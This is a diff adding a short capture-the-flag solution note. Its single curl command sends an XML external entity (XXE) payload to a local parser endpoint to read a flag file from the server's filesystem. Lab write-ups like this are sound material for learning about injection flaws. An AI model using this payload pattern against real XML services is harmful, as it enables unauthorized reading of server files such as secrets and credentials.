@@ -1,0 +1,2 @@
+Use simple command to get flag:
+curl 'http://127.0.0.1:8001/parser' -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///usr/src/app/flag.txt" >]><foo>&xxe;</foo>'
